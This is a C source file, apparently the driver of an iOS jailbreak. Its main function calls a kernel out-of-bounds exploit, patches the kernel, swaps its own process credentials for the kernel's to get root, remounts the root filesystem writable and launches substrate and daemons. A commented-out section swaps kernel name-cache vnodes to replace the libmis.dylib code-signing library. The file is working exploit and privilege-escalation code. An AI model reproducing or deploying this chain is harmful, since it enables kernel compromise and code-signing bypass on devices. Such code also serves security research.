#include "common.h"
#include "util.h"
#include "exploit.h"
#include "memory.h"
#include "patchfinder.h"
#include "patches.h"

int load_run_commands(void) {
    DIR *dir = opendir("/etc/rc.d");
    if (dir == NULL) return -1;

    struct dirent *entry = NULL;
    char path_buf[PATH_MAX] = {0};
    char *args[] = {path_buf, NULL};

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        bzero(path_buf, PATH_MAX);
        snprintf(path_buf, PATH_MAX-1, "/etc/rc.d/%s", entry->d_name);

        pid_t pid = -1;
        int rv = posix_spawn(&pid, path_buf, NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start: %s\n", path_buf);
        }
    }

    closedir(dir);
    return 0;
}

int load_user_daemons(void) {
    char *args[] = {"/bin/launchctl", "load", "/Library/LaunchDaemons", NULL};
    pid_t pid = -1;
    int status = -1;

    int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
    if (rv != 0 || pid == -1) {
        print_log("[ERROR] failed to start user daemons\n");
        return rv;
    }

    do { if (waitpid(pid, &status, 0) == -1) return status; }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
    return status;
}

int launchctl_unsetenv(void) {
    char *args[] = {"/bin/launchctl", "unsetenv", "DYLD_INSERT_LIBRARIES", NULL};
    pid_t pid = -1;
    int status = -1;

    int rv = posix_spawn(&pid, "/bin/launchctl", NULL, NULL, args, NULL);
    if (rv != 0 || pid == -1) return -1;
    
    do { if (waitpid(pid, &status, 0) == -1) return status; }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
    return status;
}

int start_daemons(void) {
    DIR *dir = opendir("/Library/LaunchDaemons");
    if (dir == NULL) return -1;

    struct dirent *entry = NULL;
    char path_buf[PATH_MAX] = {0};

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        if (strstr(entry->d_name, ".plist") == NULL) continue;

        bzero(path_buf, PATH_MAX);
        snprintf(path_buf, PATH_MAX, "/Library/LaunchDaemons/%s", entry->d_name);
        
        chmod(path_buf, 0644);
        chown(path_buf, 0, 0);
    }

    closedir(dir);
    sync();

    load_run_commands();
    if (access("/usr/libexec/substrate", F_OK) == 0) {
        char *args[] = {"/usr/libexec/substrate", NULL};
        pid_t pid = -1;
        int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start substrate\n");
        }
    }

    if (kinfo->version[0] == 7) {
        if (access("/usr/libexec/CrashHousekeeping.backup", F_OK) == 0) {
            char *args[] = {"/usr/libexec/CrashHousekeeping.backup", NULL};
            pid_t pid = -1;
            int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
            if (rv != 0 || pid == -1) {
                print_log("[WARNING] failed to start CrashHousekeeping\n");
            }
        }
    }

    load_user_daemons();
    return 0;
}

/*
uint32_t vnode_for_path(const char *path) {
    uint32_t p_fd = 0;
    uint32_t fd_ofiles = 0;
    uint32_t fproc = 0;
    uint32_t f_fglob = 0;
    uint32_t vnode = 0;
  
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    for (uint32_t i = 0; i < 10; i++) {
        usleep(10);
        sync();
    }

    if ((p_fd = kread32(kinfo->self_proc_addr + 0x90)) == 0) goto done;
    if ((fd_ofiles = kread32(p_fd + 0x0)) == 0) goto done;
    if ((fproc = kread32(fd_ofiles + (fd * 0x4))) == 0) goto done;
    if ((f_fglob = kread32(fproc + 0x8)) == 0) goto done;
    if ((vnode = kread32(f_fglob + 0x28)) == 0) goto done;

done:
    close(fd);
    return vnode;
}

int namecache_swap_vnode(const char *target, const char *replacement) {
    uint32_t target_vnode = vnode_for_path(target);
    uint32_t replacement_vnode = vnode_for_path(replacement);
    if (target_vnode == 0 || replacement_vnode == 0) return -1;

    uint32_t namecache = kread32(target_vnode + 0x1c);
    if (namecache == 0) return -1;

    kwrite32(target_vnode + 0x34, 100);
    kwrite32(target_vnode + 0x38, 100);
    kwrite32(target_vnode + 0x3c, 100);
    kwrite32(replacement_vnode + 0x34, 100);
    kwrite32(replacement_vnode + 0x38, 100);
    kwrite32(replacement_vnode + 0x3c, 100);

    kwrite32(namecache + 0x24, replacement_vnode);
    sync();
    return 0;
}
*/

int main(void) {
    setuid(0);
    setgid(0);

    uint32_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);

    if (run_oob_entry((cpu_family != CPUFAMILY_ARM_SWIFT)) != 0) {
        print_log("[-] exploit failed\n");
        return -1;
    }

    print_log("[*] exploit done\n");
    if (patch_kernel() != 0) {
        print_log("[-] failed to patch kernel\n");
        return -1;
    }

    if (kinfo->version[0] == 7) {
        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + 0x8c);
        uint32_t self_ucred = kread32(kinfo->self_proc_addr + 0x8c);
        kwrite32(kinfo->self_proc_addr + 0x8c, kern_ucred);
        setuid(0);
        setgid(0);

        char *dev = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, &dev);
        if (rv != 0) {
            for (int i = 0; i < 50; i++) {
                rv = mount("hfs", "/", MNT_UPDATE, &dev);
                if (rv == 0) break;
                usleep(10000);
            }
        }

        kwrite32(kinfo->self_proc_addr + 0x8c, self_ucred);
        print_log("[*] rootfs remounted\n");

        /*
        unlink("/usr/lib/fake.dylib");
        FILE *file = fopen("/usr/lib/fake.dylib", "wb+");
        if (file != NULL) {
            fflush(file);
            fclose(file);
        }

        sync();
        namecache_swap_vnode("/usr/lib/libmis.dylib", "/usr/lib/fake.dylib");
        */
    } else {
        launchctl_unsetenv();
    }

    print_log("[*] kernel patched\n");
    start_daemons();
    print_log("[*] done\n");
    return 0;
}